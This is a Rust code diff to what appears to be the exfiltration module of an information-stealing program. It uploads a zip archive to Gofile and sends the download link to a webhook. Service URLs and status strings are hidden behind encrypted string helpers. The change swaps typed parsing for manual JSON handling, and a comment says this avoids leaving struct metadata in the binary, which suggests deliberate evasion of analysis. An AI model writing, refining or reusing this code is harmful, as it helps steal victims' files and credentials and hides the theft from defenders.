@@ -1,29 +1,5 @@
-use serde::Deserialize;
-use serde_json::json;
+use serde_json::{json, Value};
 use crate::encrypted::*;
-
-#[allow(dead_code)]
-#[derive(Debug, Deserialize)]
-struct GofileResponse {
-    status: String,
-    data: Option<GofileData>,
-    error: Option<String>,
-}
-
-#[allow(dead_code)]
-#[derive(Debug, Deserialize)]
-struct GofileData {
-    #[serde(rename = "downloadPage")]
-    download_page: Option<String>,
-    #[serde(rename = "directLink")]
-    direct_link: Option<String>,
-    #[serde(rename = "parentFolder")]
-    parent_folder: Option<String>,
-    #[serde(rename = "fileId")]
-    file_id: Option<String>,
-    #[serde(rename = "fileName")]
-    file_name: Option<String>,
-}
 
 pub async fn upload_to_gofile(client: &reqwest::Client, zip_data: Vec<u8>, zip_name: &str) -> Option<String> {
     let upload_url = s_gofile_upload_url();
@@ -48,36 +24,32 @@ pub async fn upload_to_gofile(client: &reqwest::Client, zip_data: Vec<u8>, zip_n
     };
     
     let body = response.text().await.ok()?;
-    
-    let gofile_resp: GofileResponse = match serde_json::from_str(&body) {
-        Ok(r) => r,
+
+    // Parse manually with Value — no struct metadata in binary
+    let v: Value = match serde_json::from_str(&body) {
+        Ok(j) => j,
         Err(_) => {
             if body.contains(&s_sender_gofile_io()) || body.contains(&s_sender_download()) {
                 if let Some(start) = body.find(&s_sender_https()) {
-                    if let Some(end) = body[start..].find('"') {
-                        return Some(body[start..start + end].to_string());
-                    }
-                    if let Some(end) = body[start..].find('\'') {
-                        return Some(body[start..start + end].to_string());
-                    }
-                    if let Some(end) = body[start..].find(' ') {
-                        return Some(body[start..start + end].to_string());
+                    for delim in ['"', '\'', ' '] {
+                        if let Some(end) = body[start..].find(delim) {
+                            return Some(body[start..start + end].to_string());
+                        }
                     }
                 }
             }
             return None;
         }
     };
-    
-    if gofile_resp.status == "ok" {
-        gofile_resp.data.and_then(|d| {
-            d.download_page
-                .or(d.direct_link)
-                .or(d.file_id.map(|id| format!("{}/{}", s_gofile_download_path(), id)))
-        })
-    } else {
-        None
+
+    if v["status"].as_str() != Some("ok") { return None; }
+    let data = &v["data"];
+    if let Some(s) = data["downloadPage"].as_str().filter(|s| !s.is_empty()) { return Some(s.to_owned()); }
+    if let Some(s) = data["directLink"].as_str().filter(|s| !s.is_empty()) { return Some(s.to_owned()); }
+    if let Some(id) = data["fileId"].as_str().filter(|s| !s.is_empty()) {
+        return Some(format!("{}/{}", s_gofile_download_path(), id));
     }
+    None
 }
 
 pub async fn send_to_webhook(
@@ -91,7 +63,7 @@ pub async fn send_to_webhook(
 
     let gofile_link = upload_to_gofile(client, zip_data.clone(), &zip_name).await;
     
-    statuses.push(format!("gofile={}", if gofile_link.is_some() { "OK" } else { "FAIL" }));
+    statuses.push(if gofile_link.is_some() { s_sender_gofile_ok() } else { s_sender_gofile_fail() });
 
     let mut content = String::new();
     if let Some(ref link) = gofile_link {
